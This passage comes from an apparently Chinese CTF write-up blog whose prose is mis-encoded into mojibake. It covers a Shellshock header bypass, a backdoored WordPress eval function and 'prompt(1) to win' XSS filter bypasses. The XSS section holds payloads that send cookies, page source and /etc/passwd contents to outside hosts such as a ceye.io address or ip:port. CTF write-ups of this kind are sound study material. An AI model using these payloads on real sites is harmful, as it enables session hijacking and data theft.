&lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;&lt;?php if(is_callable('render')) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¤§æ¦‚çœ‹ä¸€ä¸‹index.phpçš„é€»è¾‘</p>
<p>è¿™ä¸ªblack_listå…¶å®å·²ç»å¾ˆæ˜æ˜¾çš„åœ¨æç¤ºè¿™æ˜¯ä¸€ä¸ªbashç ´å£³æ¼æ´äº†â€¦</p>
<p>ä¸ŠFreebufå­¦ä¸€æ³¢ï¼Œè®²çš„å¾ˆæ¸…æ¥š</p>
<p><a href="https://www.freebuf.com/articles/system/50065.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/50065.html</a></p>
<p>å¦‚æœåœ¨å…¨å±€å˜é‡ä¸­å‘ç°/flagå…³é”®å­—ï¼Œæˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\(\)\s*\&#123;\s*:;\s*\&#125;;</span><br></pre></td></tr></table></figure>

<p>æ»¡è¶³è¿™ä¸ªå½¢å¼çš„æ­£åˆ™ï¼Œå°±è¢«detected</p>
<p>å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bashç ´å£³æ¼æ´åˆ©ç”¨</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtDSO.png" alt="KUtDSO.png"></p>
<p>é¢˜ç›®ä¸­çš„putenvå°±å……å½“äº†è¿™é‡Œexportçš„ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠuser-agentä¼šæ¢æˆæˆ‘ä»¬çš„payload</p>
<p>åŒæ—¶bash -c envï¼Œæœ€ç»ˆåå¼¹shell(è¿˜æœ‰ä¸­é—´åŠ ä¸ªç©ºæ ¼å°±å¯ä»¥bypassæ­£åˆ™äº†)</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtjhV.png" alt="KUtjhV.png"></p>
<p>æœ€ç»ˆæ‹¿flagçš„payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; &#x2F;var&#x2F;tmp&#x2F;test &lt; &#x2F;var&#x2F;tmp&#x2F;test</span><br></pre></td></tr></table></figure>

<h3 id="Wordpress1"><a href="#Wordpress1" class="headerlink" title="Wordpress1"></a>Wordpress1</h3><p><strong>plugins/core.phpä¸­å‘ç°é—®é¢˜ä»£ç ï¼Œæ˜¯ä¸ªæ‰“å°flagçš„å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line">	<span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ª$hâ€¦ç¡¬æ‹¼å‡ºæ¥çš„md5å¯è¿˜è¡Œï¼Œè§£å¯†ä¸€ä¸‹è¿™ä¸ªmd5å‘ç°æ˜¯cat flagï¼Œæœ€åevalè§£å¯†åmd5çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼ å…¥ä¸€ä¸ªcat flagå°±å¯ä»¥ï¼Œå†åŠ ä¸Šä¼ªé€ ä¸€ä¸ªipã€‚</p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>è¿™ä¸‰é“è¿ä¸€èµ·çœŸçš„æŒºå¥½â€¦ä½†æ˜¯xssbotæŒ‚äº†å§ï¼Ÿâ€¦.</p>
<p>è®°å½•ä¸€ä¸‹æœ‰æ„æ€çš„Payloadå§</p>
<p>ç¬¬ä¸€å…³çš„xsså¯ä»¥é€šè¿‡svgç»•è¿‡ï¼Œæˆ–è€…imgç»•è¿‡ï¼Œå½“ç„¶å…¶ä»–ä¹Ÿæœ‰å¾ˆå¤šæ ‡ç­¾å¯ä»¥ç»•è¿‡</p>
<p><strong>imgç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot;onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥è¿™é‡Œæ˜¯è¿‡æ»¤æ‰äº†onerrorä¸è¿‡å¯ä»¥é€šè¿‡å»æ‰å‰é¢çš„ç©ºæ ¼bypassï¼Œè‡³äºæ‹¬å·çš„è¿‡æ»¤ï¼Œç›´æ¥htmlç¼–ç å°±å¯ä»¥äº†</p>
<p>è¿™é‡Œçš„htmlç¼–ç å¯¹åº”çš„alert(1)ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ‰“cookie,å¯ä»¥ç”¨å¦‚ä¸‹payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…è¯´</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://ip:port/"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>svgç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip:port&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xssæ‰“æºç </strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xx.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.createElement(&quot;img&quot;);</span><br><span class="line">img.src&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;+escape(document.body.innerHTML);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>é€šè¿‡ajaxæ‰“å‡ºå›æ˜¾å†…å®¹</strong></p>
<p><strong>GETå‹</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xxx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>GET<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.send();</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>POSTå‹</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>POST<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.setRequestHeader("</span>Content-type<span class="string">","</span>application/x-www-form-urlencoded<span class="string">");</span></span><br><span class="line"><span class="string">xmlhttp.send("</span>url=file:<span class="comment">///etc/passwd");</span></span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/Hackme-web/" data-id="ckabsu3870018kkvr0wa0ek8t" class="article-share-link" data-share="baidu" data-title="Hackme-web">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/Hackme-web/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-prompt-1-to-win" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/20/prompt-1-to-win/" class="article-date">
  <time datetime="2019-10-20T12:21:59.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/prompt-1-to-win/">prompt(1) to win</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KPz0bR.png" alt="KPz0bR.png"></p>
<p>é—­åˆå°±å®Œäº‹äº†ã€‚&lt;svg/onload=alert(1)&gt;</p>
<p>IE10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onresize&#x3D;prompt(1) &quot;</span><br></pre></td></tr></table></figure>

<p>IE10ä¸‹ï¼Œç¬¬ä¸€æ¬¡åŠ è½½é¡µé¢æ—¶ï¼Œä¼šè°ƒç”¨resizeå‡½æ•°</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiHezR.png" alt="KiHezR.png"></p>
<p>é€šè¿‡æ­£åˆ™åƒæ‰å®Œæ•´çš„æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸é€šè¿‡å®Œæ•´æ ‡ç­¾å°±èƒ½xssçš„æ ‡ç­¾</p>
<p>ä¹Ÿå°±æ˜¯ä¸èƒ½ç”¨é—­åˆæ ‡ç­¾äº†ï¼Œéœ€è¦æ‰¾ä¸€äº›è‡ªé—­å’Œæ ‡ç­¾è¿›è¡Œxss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;body onload&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¸‰ç§éƒ½å¯ä»¥è¿›è¡Œxss</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(/[=(]/g, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤ç¬¦å·å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[,],&#x3D;,(</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiP89P.png" alt="KiP89P.png"></p>
<p>å¾ˆæœ‰è¶£çš„XSS bypass</p>
<p><a href="https://blog.csdn.net/weixin_30408165/article/details/99649981" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30408165/article/details/99649981</a></p>
<p>é¦–å…ˆ`å­—ç¬¦æ˜¯å¯ä»¥æŠŠåŒ…è£¹ä½çš„å­—ç¬¦ä¸²å½“æˆå­—ç¬¦ï¼ŒåŒæ—¶æŠŠunicodeè½¬åŒ–ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œå³å¯æˆåŠŸalertã€‚</p>
<p>setTimeoutå‡½æ•°</p>
<p><img src="https://s2.ax1x.com/2019/10/16/Kin3ZV.png" alt="Kin3ZV.png"></p>
<p>çœ‹ç½‘ä¸Šçš„å…¶ä»–wpå¤§éƒ½æ˜¯é€šè¿‡&lt;svg&gt;å»è§£æhtmlç¼–ç ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;&#x2F;script&gt;</span><br><span class="line">&#x2F;&#x2F;å¦ä¸€ç§payload</span><br><span class="line">&lt;script&gt;eval.call&#96;$&#123;&#39;prompt\x281)&#39;&#125;&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(/-&gt;/g, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>html5çš„æ³¨é‡Šæ ‡ç­¾ä¸ä»…å¯ä»¥ä½¿ç”¨<code>--&gt;</code>ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>--!&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;svg&#x2F;onload&#x3D;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (/^(?:https?:)?\/\/prompt\.ml\<span class="comment">//i.test(decodeURIComponent(input))) &#123;</span></span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@Your_vps</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨çŸ¥è¯†ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1@www.baidu.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šè®¿é—®çš„æ˜¯<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p>ä¸è¿‡è¿™é“é¢˜åŒ¹é…çš„æ˜¯<a href="http://prompt.ml/ï¼Œåé¢çš„è¿™ä¸ª/å¾ˆéº»çƒ¦ï¼Œæˆ‘ä»¬å¦‚æœç”¨http://127.0.0.1/@www.baidu.com/æ˜¯æ— æ³•è®¿é—®åˆ°ç™¾åº¦çš„ï¼Œè¿™ä¸ª/å¿…é¡»è¦å»æ‰ï¼Œè¿™é‡Œdecodeå‡½æ•°å¸®äº†æˆ‘ä»¬è¿™ä¸ªå¿™ï¼Œé€šè¿‡" target="_blank" rel="noopener">http://prompt.ml/ï¼Œåé¢çš„è¿™ä¸ª/å¾ˆéº»çƒ¦ï¼Œæˆ‘ä»¬å¦‚æœç”¨http://127.0.0.1/@www.baidu.com/æ˜¯æ— æ³•è®¿é—®åˆ°ç™¾åº¦çš„ï¼Œè¿™ä¸ª/å¿…é¡»è¦å»æ‰ï¼Œè¿™é‡Œdecodeå‡½æ•°å¸®äº†æˆ‘ä»¬è¿™ä¸ªå¿™ï¼Œé€šè¿‡</a></p>
<p><a href="http://prompt.ml%2f@Your_vps" target="_blank" rel="noopener">http://prompt.ml%2f@Your_vps</a> æ—¢å¯ä»¥bypassæ­£åˆ™ï¼Œåˆå¯ä»¥è§„é¿æ‰/è¿™ä¸ªå­—ç¬¦ã€‚</p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFrcPU.png" alt="KFrcPU.png"></p>
<p>è¿™é¢˜è¿‡æ»¤æ‰äº†onfocusï¼ŒOnxxx=ä¹‹ç±»çš„å½¢å¼ï¼Œå¯¹äºonxxx=çš„bypassæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¢è¡Œæ¥Bypass,å› ä¸ºå±æ€§æè¿°ä¸åœ¨åŒä¸€è¡Œå¹¶ä¸å½±å“è§£æï¼Œå¦‚æœæ²¡è¿‡æ»¤onfocusï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹payloadç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†æƒ…å†µä¸‹å¯ä»¥é€šè¿‡è¦†ç›–typeï¼Œè¿›è¡Œonerrorè§¦å‘xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;&quot;image&quot; src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>å³å¯è§¦å‘xss</p>
<p>çœ‹å¤§ä½¬çš„åšå®¢å­¦åˆ°äº†åœ¨IEä¸‹å¯ä»¥é€šè¿‡onresizeè§¦å‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onresize</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = JSON.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = document.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i in formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(document.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘å°±æ˜¯è‡ªåŠ¨é€šè¿‡ä¼ è¿›å»å‚æ•°å¡«å†™è¡¨å•ï¼Œå¹¶ä¸”submitï¼Œä¸è¿‡åœ¨submitå‰éœ€è¦å¯¹actionå±æ€§è¿›è¡Œä¸€ä¸‹æ£€æµ‹</p>
